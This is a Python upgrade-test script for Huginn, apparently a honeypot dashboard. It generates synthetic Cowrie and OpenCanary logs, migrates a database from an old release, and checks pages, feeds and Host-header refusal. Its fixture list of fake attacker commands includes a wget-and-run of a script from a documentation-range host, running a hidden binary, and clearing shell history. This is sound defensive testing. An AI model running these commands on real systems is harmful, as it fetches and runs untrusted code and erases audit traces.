#!/usr/bin/env python3
"""Upgrade test: build a database with an old Huginn release, then open it with this one.

    python3 tools/upgrade-test.py                 # default: v0.20.0 v0.35.0 and the newest earlier tag
    python3 tools/upgrade-test.py v0.9.0 v0.42.0  # any tags

For each tag: the old app.py (from git) imports made-up Cowrie and OpenCanary logs into a fresh home, the way an
old install would have collected them. Then this checkout opens the same database and imports one more day, and
the test checks that nothing was lost, the database is intact, and the pages, feeds, exports and /metrics still
work. Then the upgraded database is served the way a real install runs it, with HUGINN_ALLOWED_HOSTS set to names
that do not include 127.0.0.1 (as on installs from before rc3): update-huginn.sh must still read the version
(rc4 rolled back without it), and other Host names must get 421. All addresses are from the documentation
ranges (RFC 5737). Nothing leaves the machine.
Exit code 0 = every tag passed.
"""
import json, os, random, re, socket, sqlite3, subprocess, sys, tempfile, time, traceback, urllib.error, urllib.request
from datetime import datetime, timedelta, timezone

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
IPS = ["192.0.2.%d" % i for i in range(10, 60)] + ["198.51.100.%d" % i for i in range(10, 60)] + ["203.0.113.%d" % i for i in range(10, 40)]
CMDS = ["uname -a", "cat /proc/cpuinfo | grep name | wc -l", "cd /tmp; wget http://198.51.100.200/x.sh; sh x.sh", "free -m",
        "ls -la /home", "echo -e '\\x41\\x42' > .s; chmod +x .s; ./.s", "crontab -l", "history -c"]


def env_for(home):
    return dict(os.environ, HUGINN_BASE=home, HUGINN_DEMO="1", HUGINN_TZ="UTC", HUGINN_ENRICH="0", HUGINN_UPDATE_CHECK="0",
                HUGINN_DECOY_CAP="0", HUGINN_ALLOW_PRIVATE="1",  # versions before 0.11 only kept test addresses with this
                HUGINN_BAIT_FILE=os.path.join(home, "bait.json"), HUGINN_LOG_LEVEL="error",
                HUGINN_PERSONAS="2225=server,2323=camera", HUGINN_METRICS_TOKEN="upgrade-test-token-0123456789")


def ts(t):
    return datetime.fromtimestamp(t, timezone.utc)


def make_logs(d, start, days, seed):
    # Cowrie sessions (logins, commands, a download, a proxy request) and OpenCanary hits, spread over `days` days.
    rnd = random.Random(seed)
    cow, can = [], []
    for n in range(days * 60):
        t = start + rnd.uniform(0, days * 86400)
        ip = rnd.choice(IPS)
        sid = "%08x" % rnd.getrandbits(32)
        proto, port = rnd.choice([("ssh", 2225), ("telnet", 2323)])
        ev = lambda eid, dt=0, **kw: cow.append(json.dumps(dict({"eventid": eid, "src_ip": ip, "session": sid,
                                                                  "timestamp": ts(t + dt).strftime("%Y-%m-%dT%H:%M:%S.%fZ")}, **kw)))
        ev("cowrie.session.connect", protocol=proto, dst_port=port, src_port=rnd.randint(1024, 65000), dst_ip="10.0.0.5")
        if proto == "ssh":
            ev("cowrie.client.version", 0.1, version="SSH-2.0-Go")
        for k in range(rnd.randint(1, 4)):
            ev("cowrie.login.failed", 1 + k, username=rnd.choice(["root", "admin", "pi"]), password=rnd.choice(["123456", "admin", "x"]))
        dur = 5.0
        if rnd.random() < 0.6:
            ev("cowrie.login.success", 6, username="root", password="root")
            for k, c in enumerate(rnd.sample(CMDS, rnd.randint(1, 5))):
                ev("cowrie.command.input", 7 + k, input=c)
            if rnd.random() < 0.2:
                ev("cowrie.session.file_download", 13, url="http://198.51.100.200/x.sh", outfile="var/lib/cowrie/downloads/ab",
                   shasum="%064x" % rnd.getrandbits(256), destfile="/tmp/x.sh")
            if proto == "ssh" and rnd.random() < 0.2:
                ev("cowrie.direct-tcpip.request", 14, dst_ip="192.0.2.250", dst_port=80, src_ip=ip)
            dur = 15.0
        ev("cowrie.session.closed", dur, duration=dur)
    for n in range(days * 120):
        t = start + rnd.uniform(0, days * 86400)
        port, ld = rnd.choice([(21, {"USERNAME": "anonymous", "PASSWORD": "x"}), (8080, {"METHOD": "GET", "PATH": "/.env", "USERAGENT": "curl"}),
                               (3306, {"USERNAME": "root", "PASSWORD": "root"}), (6379, {"CMD": "INFO", "ARGS": ""}), (5900, {})])
        can.append(json.dumps({"dst_port": port, "src_host": rnd.choice(IPS), "logtype": 3000, "logdata": ld,
                               "utc_time": ts(t).strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]}))
    cow.sort(key=lambda l: json.loads(l)["timestamp"])
    paths = [os.path.join(d, "cowrie.json"), os.path.join(d, "opencanary.log")]
    open(paths[0], "w").write("\n".join(cow) + "\n")
    open(paths[1], "w").write("\n".join(can) + "\n")
    return paths


def counts(db):
    c = sqlite3.connect("file:%s?mode=ro" % db, uri=True)
    tables = {r[0] for r in c.execute("SELECT name FROM sqlite_master WHERE type='table'")}
    out = {t: c.execute("SELECT COUNT(*) FROM %s" % t).fetchone()[0] for t in ("ips", "sessions", "events", "files") if t in tables}
    out["kinds"] = dict(c.execute("SELECT kind, COUNT(*) FROM events GROUP BY kind").fetchall())
    c.close()
    return out


CHECK = r'''
import json, sqlite3, sys, os
sys.path.insert(0, sys.argv[1])
import app
app.init_db()
con = app.connect()
assert con.execute("PRAGMA integrity_check").fetchone()[0] == "ok", "integrity_check"
ip = con.execute("SELECT ip FROM ips ORDER BY cmds DESC, score DESC LIMIT 1").fetchone()[0]
pages = {"overview": lambda: app.v_overview(), "ips": lambda: app.v_ips({}), "ip": lambda: app.v_ip(ip),
         "search": lambda: app.v_search({"q": "wget"}), "files": lambda: app.v_files(), "campaigns": lambda: app.v_campaigns(),
         "settings": lambda: app.v_settings()}
for name, f in pages.items():
    out = f()
    out = out.decode() if isinstance(out, bytes) else str(out)
    assert len(out) > 500 and "Traceback" not in out, "page " + name
for fmt in ("txt", "nft", "ipset", "mikrotik", "csv", "c2"):
    app.render_feed(fmt, app.blocklist_ips(con, 1, 3650, False, True, False), True)
feed = app.render_feed("txt", app.blocklist_ips(con, 1, 3650, False, True, False), True)
feed = feed[0] if isinstance(feed, tuple) else feed
d = app.export_ip(ip)
json.dumps(d, default=str)
m = app.metrics_text(con)
assert "huginn_attackers" in m, "metrics"
print(json.dumps({"feed_lines": sum(1 for l in str(feed).splitlines() if l and not l.startswith("#")), "ip": ip}))
'''


def run(cmd, env, cwd=None):
    r = subprocess.run(cmd, env=env, cwd=cwd, capture_output=True, text=True, timeout=900)
    if r.returncode:
        raise RuntimeError("%s failed (%d): %s" % (" ".join(cmd[:3]), r.returncode, (r.stderr or r.stdout)[-800:]))
    return r.stdout


def one(tag, work):
    home, old, logs = (os.path.join(work, tag, x) for x in ("home", "old", "logs"))
    for d in (home, old, logs):
        os.makedirs(d)
    json.dump({"mysql_backup": "Upgrade-Test-Bait-0001"}, open(os.path.join(home, "bait.json"), "w"))
    arc = subprocess.run(["git", "-C", ROOT, "archive", tag], capture_output=True, check=True).stdout
    subprocess.run(["tar", "-x", "-C", old], input=arc, check=True)
    env = env_for(home)
    now = time.time()
    run([sys.executable, os.path.join(old, "app.py"), "import"] + make_logs(logs, now - 10 * 86400, 7, 1), env)
    db = os.path.join(home, "data", "huginn.db")
    before = counts(db)
    if not before.get("events"):
        raise RuntimeError("the old version stored nothing")
    # This checkout opens the old database (migrations run in init_db) and adds one more day.
    new_logs = os.path.join(logs, "new")
    os.makedirs(new_logs)
    out = run([sys.executable, os.path.join(ROOT, "app.py"), "import"] + make_logs(new_logs, now - 2 * 86400, 1, 2), env)
    after = counts(db)
    lost = {k: (before[k], after.get(k, 0)) for k in ("ips", "sessions", "events", "files") if k in before and after.get(k, 0) < before[k]}
    lost.update({"kind " + k: (v, after["kinds"].get(k, 0)) for k, v in before["kinds"].items() if after["kinds"].get(k, 0) < v})
    if lost:
        raise RuntimeError("rows lost in the upgrade: %s" % lost)
    res = json.loads(run([sys.executable, "-c", CHECK, ROOT], env).strip().splitlines()[-1])
    # Importing the old logs again must not store them twice (same dedupe across versions).
    again = run([sys.executable, os.path.join(ROOT, "app.py"), "import", os.path.join(logs, "cowrie.json"), os.path.join(logs, "opencanary.log")], env)
    dup = sum(int(l.split(",")[1].split()[0]) for l in again.splitlines() if " new," in l)
    res["served"] = serve_check(env)
    return before, after, res, dup


def serve_check(env):
    """Serve the upgraded database with a Host list and ask it the way update-huginn.sh does."""
    with socket.socket() as so:
        so.bind(("127.0.0.1", 0))
        port = so.getsockname()[1]
    env = dict(env, HUGINN_PORT=str(port), HUGINN_BIND="127.0.0.1", HUGINN_ALLOWED_HOSTS="huginn.example,192.0.2.1:%d" % port)
    want = re.search(r'^HUGINN_VERSION = "([^"]+)"', open(os.path.join(ROOT, "app.py")).read(), re.M)[1]
    # The exact Python that update-huginn.sh runs to read the running version
    snippet = re.search(r"running_version\(\) \{\n  python3 - \"\$PORT\" <<'PY'\n(.*?)\nPY\n", open(os.path.join(ROOT, "update-huginn.sh")).read(), re.S)[1]
    srv = subprocess.Popen([sys.executable, os.path.join(ROOT, "app.py"), "serve"], env=env, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE, text=True)
    try:
        got = ""
        for _ in range(60):
            got = subprocess.run([sys.executable, "-c", snippet, str(port)], capture_output=True, text=True, timeout=30).stdout.strip()
            if got or srv.poll() is not None:
                break
            time.sleep(0.5)
        if got != want:
            raise RuntimeError("update-huginn.sh reads version %r, expected %r (server: %s)" % (got, want, srv.poll() is None and "running" or srv.stderr.read()[-400:]))

        def get(path, host):
            req = urllib.request.Request("http://127.0.0.1:%d%s" % (port, path), headers={"Host": host})
            try:
                r = urllib.request.urlopen(req, timeout=10)
                return r.status, r.read()
            except urllib.error.HTTPError as e:
                return e.code, e.read()
        if get("/login", "evil.example")[0] != 421:
            raise RuntimeError("another Host name was not refused with 421")
        if get("/login", "huginn.example")[0] == 421:
            raise RuntimeError("an allowed Host name was refused")
        code, body = get("/healthz", "evil.example")
        if set(json.loads(body)) != {"ok"}:
            raise RuntimeError("/healthz told an unknown Host name more than up or down")
    finally:
        srv.terminate()
        srv.wait(10)
    return want


def vkey(t):
    # v1.0.0-rc1 sorts before v1.0.0; tags that are not versions sort first
    import re
    m = re.fullmatch(r"v(\d+)\.(\d+)\.(\d+)(?:-rc(\d+))?", t)
    return (int(m[1]), int(m[2]), int(m[3]), int(m[4]) if m[4] else 10 ** 6) if m else (0,)


def main():
    tags = sys.argv[1:]
    if not tags:
        all_tags = sorted(subprocess.run(["git", "-C", ROOT, "tag", "--list", "v*"], capture_output=True, text=True).stdout.split(),
                          key=vkey)
        head = set(subprocess.run(["git", "-C", ROOT, "tag", "--points-at", "HEAD"], capture_output=True, text=True).stdout.split())
        tags = ["v0.20.0", "v0.35.0", [t for t in all_tags if t not in head][-1]]
    work = tempfile.mkdtemp(prefix="huginn-upgrade-")
    bad = 0
    for tag in tags:
        try:
            before, after, res, dup = one(tag, work)
            print("PASS %-8s old: %d IPs, %d sessions, %d events -> now: %d IPs, %d sessions, %d events; %d feed lines; "
                  "re-import stored %d twice; served %s with a Host list" % (tag, before["ips"], before["sessions"], before["events"],
                                                after["ips"], after["sessions"], after["events"], res["feed_lines"], dup, res["served"]))
            if dup:
                print("     note: the dedupe key changed since %s, so importing its old log files again stores them twice" % tag)
        except Exception as e:
            bad += 1
            print("FAIL %-8s %s" % (tag, e))
            if os.environ.get("DEBUG"):
                traceback.print_exc()
    print("work dir:", work)
    sys.exit(1 if bad else 0)


if __name__ == "__main__":
    main()
